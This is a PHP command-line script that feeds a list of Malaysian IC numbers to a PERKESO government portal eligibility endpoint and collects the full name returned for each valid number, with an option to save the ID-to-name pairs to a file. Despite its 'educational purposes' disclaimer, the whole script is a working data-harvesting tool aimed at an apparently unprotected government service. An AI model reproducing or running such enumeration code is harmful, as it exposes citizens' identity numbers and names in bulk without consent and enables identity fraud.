<?php

function getFileNameFromUser($prompt) {
    echo $prompt;
    return trim(fgets(STDIN));
}

function getRandomICFromFile($filename) {
    $icNumbers = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return $icNumbers[array_rand($icNumbers)];
}

function constructURL($icNumber) {
    $baseUrl = "https://eis.perkeso.gov.my/eisportal/insured/appl/isEligible";
    return $baseUrl . "?idNo=&newIc=" . $icNumber;
}

function fetchContent($url) {
    return file_get_contents($url);
}

function saveToFile($filename, $data) {
    file_put_contents($filename, $data);
}

function processICNumbers($filename) {
    $icNumbers = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $totalICs = count($icNumbers);

    $validResults = [];

    foreach ($icNumbers as $index => $icNumber) {
        $icNumber = trim($icNumber);
        $url = constructURL($icNumber);
        $content = fetchContent($url);

        if ($content !== false) {
            $data = json_decode($content, true);
            if ($data !== null && !empty($data)) {
                $validResults[$icNumber] = $data[0]['NAME'];
            }
        }

        echo "Progress: " . ($index + 1) . " / $totalICs\r";
    }

    echo PHP_EOL;

    return $validResults;
}

function displayValidResults($validResults) {
    echo "SlrmyApi Valid Result IC :\n";
    foreach ($validResults as $icNumber => $fullName) {
        echo "I/C = $icNumber : $fullName\n";
    }
}

function main() {
    echo "\033[1;31m";
    echo "DISCLAIMER\n";
    echo "\033[0m";

    echo "This Data is intended for educational purposes only. The information provided is meant to teach and demonstrate cybersecurity concepts, ethical hacking techniques, and the importance of securing digital systems.\n\n";

    echo "\033[1;31m";
    echo "DISCLAIMER of LIABILITY\n";
    echo "\033[0m";

    echo "The Author is not responsible for any misuse, consequences, or damages that may arise from the use or misuse of the information and tools presented in this script.\n\n";

    echo "\033[1;31m";
    echo "USER AGREEMENT\n";
    echo "\033[0m";

    echo "By using this service, you agree to fully comply with the cybersecurity laws of Malaysia. Any activities contrary to the law are prohibited.\n";

    $agree = strtoupper(getFileNameFromUser("(y/N)"));

    if ($agree === 'Y') {
        $filename = getFileNameFromUser("Enter the name of the TXT file: ");
        $validResults = processICNumbers($filename);

        if (!empty($validResults)) {
            displayValidResults($validResults);

            $saveResult = strtoupper(getFileNameFromUser("Do you want to save the result? (y/N): "));
            if ($saveResult === 'Y') {
                $saveFilename = getFileNameFromUser("Enter the name of the TXT file to save: ");
                saveToFile($saveFilename, json_encode($validResults, JSON_PRETTY_PRINT));
                echo "Results saved to $saveFilename\n";
            }
        } else {
            echo "No valid results found.\n";
        }
    } else {
        echo "Script terminated.\n";
    }
}

main();
?>